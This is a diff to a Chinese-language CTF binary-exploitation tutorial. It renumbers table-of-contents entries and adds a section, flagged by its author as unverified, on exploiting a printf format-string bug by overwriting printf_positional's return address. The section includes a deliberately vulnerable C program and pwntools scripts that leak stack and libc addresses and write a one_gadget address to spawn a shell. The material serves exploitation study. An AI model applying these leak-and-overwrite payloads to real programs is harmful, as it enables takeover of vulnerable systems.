@@ -119,47 +119,52 @@ Table of Contents
       * [Exploit 2](#exploit-2-1)
     * [实战](#实战-5)
     * [参考](#参考-8)
-  * [format string attack subfunction](#format-string-attack-subfunction)
-  * [integer overflow](#integer-overflow)
-  * [ropchain](#ropchain)
+  * [format string attack subfunction(待考究, 不要看)](#format-string-attack-subfunction待考究-不要看)
     * [介绍](#介绍-10)
-    * [ropchain](#ropchain-1)
-      * [ROPgadget](#ropgadget)
-        * [Exploit](#exploit-8)
-      * [Ropper](#ropper)
-        * [Exploit](#exploit-9)
+    * [attack subfunction](#attack-subfunction)
+      * [Exploit](#exploit-8)
     * [实战](#实战-6)
     * [参考](#参考-9)
-  * [orw shellcode injection](#orw-shellcode-injection)
+  * [integer overflow](#integer-overflow)
+  * [ropchain](#ropchain)
     * [介绍](#介绍-11)
+    * [ropchain](#ropchain-1)
+      * [ROPgadget](#ropgadget)
+        * [Exploit](#exploit-9)
+      * [Ropper](#ropper)
+        * [Exploit](#exploit-10)
+    * [实战](#实战-7)
+    * [参考](#参考-10)
+  * [orw shellcode injection](#orw-shellcode-injection)
+    * [介绍](#介绍-12)
     * [沙盒](#沙盒)
       * [prctl沙盒](#prctl沙盒)
       * [seccomp函数库沙盒](#seccomp函数库沙盒)
     * [open, read, write系统调用](#open-read-write系统调用)
     * [orw shellcode](#orw-shellcode)
-      * [Exploit](#exploit-10)
+      * [Exploit](#exploit-11)
       * [pwntools Exploit](#pwntools-exploit)
     * [拓展 BPF](#拓展-bpf)
-    * [实战](#实战-7)
-    * [参考](#参考-10)
-  * [or shellcode injection](#or-shellcode-injection)
-    * [介绍](#介绍-12)
-    * [cmp与jz](#cmp与jz)
-    * [or shellcode](#or-shellcode)
-      * [Exploit](#exploit-11)
     * [实战](#实战-8)
     * [参考](#参考-11)
-  * [double shellcode injection](#double-shellcode-injection)
-  * [mprotect shellcode injection](#mprotect-shellcode-injection)
+  * [or shellcode injection](#or-shellcode-injection)
     * [介绍](#介绍-13)
-    * [mprotect](#mprotect)
-    * [mprotect shellcode](#mprotect-shellcode)
+    * [cmp与jz](#cmp与jz)
+    * [or shellcode](#or-shellcode)
       * [Exploit](#exploit-12)
     * [实战](#实战-9)
     * [参考](#参考-12)
+  * [double shellcode injection](#double-shellcode-injection)
+  * [mprotect shellcode injection](#mprotect-shellcode-injection)
+    * [介绍](#介绍-14)
+    * [mprotect](#mprotect)
+    * [mprotect shellcode](#mprotect-shellcode)
+      * [Exploit](#exploit-13)
+    * [实战](#实战-10)
+    * [参考](#参考-13)
   * [alphanumeric shellcode injection](#alphanumeric-shellcode-injection)
   * [bypass canary](#bypass-canary)
-    * [介绍](#介绍-14)
+    * [介绍](#介绍-15)
     * [canary保护](#canary保护)
     * [printf leak canary](#printf-leak-canary)
     * [puts leak canary](#puts-leak-canary)
@@ -168,22 +173,22 @@ Table of Contents
     * [SSP leak](#ssp-leak)
     * [劫持\_\_stack\_chk\_fail](#劫持__stack_chk_fail)
     * [利用auxv控制](#利用auxv控制)
-    * [实战](#实战-10)
-    * [参考](#参考-13)
+    * [实战](#实战-11)
+    * [参考](#参考-14)
   * [x86绕过ecx](#x86绕过ecx)
   * [dynelf](#dynelf)
   * [one\_gadget use](#one_gadget-use)
-    * [介绍](#介绍-15)
-    * [one\_gadget](#one_gadget)
-    * [参考](#参考-14)
-  * [stack migrate](#stack-migrate)
     * [介绍](#介绍-16)
+    * [one\_gadget](#one_gadget)
+    * [参考](#参考-15)
+  * [stack migrate](#stack-migrate)
+    * [介绍](#介绍-17)
     * [leave指令](#leave指令)
     * [栈迁移](#栈迁移)
-      * [Exploit](#exploit-13)
+      * [Exploit](#exploit-14)
     * [栈劫持](#栈劫持)
-    * [实战](#实战-11)
-    * [参考](#参考-15)
+    * [实战](#实战-12)
+    * [参考](#参考-16)
   * [vsyscall trick](#vsyscall-trick)
   * [chunk extend and overlapping](#chunk-extend-and-overlapping)
   * [unlink](#unlink)
@@ -198,26 +203,26 @@ Table of Contents
   * [realloc trick](#realloc-trick)
   * [setcontext trick](#setcontext-trick)
   * [fix the symbol table](#fix-the-symbol-table)
-    * [介绍](#介绍-17)
+    * [介绍](#介绍-18)
     * [符号表](#符号表)
     * [剥离符号表](#剥离符号表)
     * [恢复符号表](#恢复符号表)
-    * [参考](#参考-16)
+    * [参考](#参考-17)
 * [工具篇](#工具篇)
   * [ROPgadget](#ropgadget-1)
-    * [介绍](#介绍-18)
+    * [介绍](#介绍-19)
     * [安装](#安装-1)
     * [使用](#使用)
   * [Ropper](#ropper-1)
-    * [介绍](#介绍-19)
+    * [介绍](#介绍-20)
     * [安装](#安装-2)
     * [使用](#使用-1)
   * [one\_gadget](#one_gadget-1)
-    * [介绍](#介绍-20)
+    * [介绍](#介绍-21)
     * [安装](#安装-3)
     * [使用](#使用-2)
   * [seccomp\-tools](#seccomp-tools)
-    * [介绍](#介绍-21)
+    * [介绍](#介绍-22)
     * [安装](#安装-4)
     * [使用](#使用-3)
   * [LibcSearcher](#libcsearcher)
@@ -229,19 +234,19 @@ Table of Contents
   * [pwnable\.tw](#pwnabletw)
     * [start](#start)
       * [分析](#分析-1)
-      * [Exploit](#exploit-14)
+      * [Exploit](#exploit-15)
     * [orw](#orw)
       * [分析](#分析-2)
-      * [Exploit](#exploit-15)
+      * [Exploit](#exploit-16)
     * [CVE\-2018\-1160](#cve-2018-1160)
-      * [参考](#参考-17)
+      * [参考](#参考-18)
     * [calc](#calc)
       * [分析](#分析-3)
     * [dubblesort](#dubblesort)
   * [2021 蓝帽杯](#2021-蓝帽杯)
     * [slient](#slient)
       * [分析](#分析-4)
-      * [Exploit](#exploit-16)
+      * [Exploit](#exploit-17)
   * [2021 长城杯](#2021-长城杯)
     * [K1ng\_in\_h3Ap\_I](#k1ng_in_h3ap_i)
       * [分析](#分析-5)
@@ -2507,9 +2512,127 @@ o.interactive()
 
 
 
-## format string attack subfunction
+## format string attack subfunction(待考究, 不要看)
+
+### 介绍
+
+这是在做西湖论剑遇到题型, 利用的主要环境就是一个死循环, 你只能输入和格式化字符串漏洞, 不能退出这个循环, 除了直接kill掉程序, 所以就没没办法像上一篇的方法去覆盖main函数的函数返回地址, 所以这里就采取攻击printf子函数的一种方法来实现跳出循环执行get shell
+
+### attack subfunction
+
+该题型其实采用的思想是printf处理format格式化字符串是在某一个子函数中, 只要在解析的时候覆盖子函数的函数返回地址, 就可以跳出执行shell, 可以一道题来讲
+
+```c
+#include<stdio.h>
+int main() {
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    char buf[0x20];
+    while(1) {
+        scanf("%32s", buf);
+        printf(buf);
+    }
+}
+// gcc sub_printf.c -o sub_printf
+```
+
+按照上一篇的思路, 首先需要泄露库函数真实地址和栈地址, 库函数地址是为了计算one_gadget真实地址, 而栈地址是为了过一会计算子函数的函数返回地址栈帧的地址
+
+gdb设置断点在printf处, 计算上述两个值的偏移量
+
+![screenshots](Self-help_Clown.assets/screenshots-16497342463661.gif)
+
+可以看出标出来的两个栈帧偏移量分别为10和13
+
+```python
+from pwn import*
+o = process('./sub_printf')
+elf = ELF('./sub_printf')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+print hex(stack), hex(libc_start_main)
+o.interactive()
+```
+
+下一步就是去找one_gadget
+
+![screenshots](Self-help_Clown.assets/screenshots-16497345775883.gif)
+
+```python
+libc_base = libc_start_main - libc.sym['__libc_start_main']
+one_gadget = libc_base + 0x4f2a5
+```
+
+接下来就是最关键的去找子函数的函数返回地址的调试过程, 我们首先需要知道哪个子函数对%n进行了解析并写入
+
+![image-20220412114428681](Self-help_Clown.assets/image-20220412114428681.png)
+
+比如我们用%10$n向图中标注的地方写入字节, 然后用watch指令监测哪个地方对该地址进行了写操作
+
+![screenshots](Self-help_Clown.assets/screenshots-16497355924355.gif)
+
+可以看到它停在了printf_positional函数内, 其实是jmp指令的上一条指令对栈进行了写入
+
+![image-20220412142825601](Self-help_Clown.assets/image-20220412142825601.png)
+
+暂停的地方其实栈已经写入完成了
+
+![image-20220412143028349](Self-help_Clown.assets/image-20220412143028349.png)
+
+栈内容由原来的1变为了0, 接下来我们要找一下printf_positional的函数返回地址计算偏移量, 其实就是rbp+8的位置, 在调试的时候要在中间加断点, 否则会程序会跑飞, 直接跑过ret指令, 比如以下情况
+
+![screenshots](Self-help_Clown.assets/screenshots-16497462712767.gif)
+
+直接跑飞到了vprintf函数了, 以下是没跑飞的情况
+
+![screenshots](Self-help_Clown.assets/screenshots-16497465172949.gif)
+
+这个0x7fffffffb5c8就是该函数的返回地址的栈帧, 和泄露出来的栈地址的偏移量为0x7fffffffe460-0x7fffffffb5c8=11928, 所以之后都可以通过偏移量来知道该函数的函数返回地址的栈地址了
+
+```python
+ret_addr = stack - 11928
+```
+
+gdb调试的one_gadget地址为0x7ffff7a312a5, 和函数返回地址那个地址0x7ffff7a3ec8a就最后两个字节不同, 所以直接覆盖最后两个字节就行, 整合脚本, 和上一篇差不多原理
+
+#### Exploit
+
+```python
+from pwn import*
+o = process('./sub_printf')
+elf = ELF('./sub_printf')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+print hex(stack), hex(libc_start_main)
+libc_base = libc_start_main - libc.sym['__libc_start_main']
+one_gadget = libc_base + 0x4f2a5
+ret_addr = stack - 11928
+payload = "%{0}p%{1}$hn".format(one_gadget & 0xffff, 9)	# 为啥这样填可以参考上一篇文章
+payload = payload.ljust(24, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+o.interactive()
+```
 
 
+
+
+
+
+
+
+
+### 实战
+
+-   [2021 西湖论剑 noleakfmt]()
+
+### 参考
 
 ## integer overflow
 
